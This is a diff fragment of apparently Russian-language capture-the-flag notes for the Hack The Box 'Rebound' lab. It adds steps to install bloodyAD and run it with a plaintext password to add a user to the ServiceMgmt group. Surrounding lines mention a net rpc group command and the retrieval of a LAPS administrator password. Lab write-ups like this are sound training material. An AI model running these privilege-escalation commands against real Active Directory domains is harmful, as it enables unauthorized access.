@@ -463,6 +463,16 @@ net rpc group addmem "SERVICEMGMT" "OOREND" -U "REBOUND.HTB/OOREND" -S "REBOUND.
 
 https://github.com/CravateRouge/bloodyAD?tab=readme-ov-file
 
+python3 -m venv venv
+
+source venv/bin/activate
+
+pip3 install -r requirements.txt  
+
+
+./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add groupMember ServiceMgmt oorend		((Добавить пользователя в группу))
+
+
  # Получение пароля LAPS Admin
 
 	Юзер состоит в групе LAPS Admin
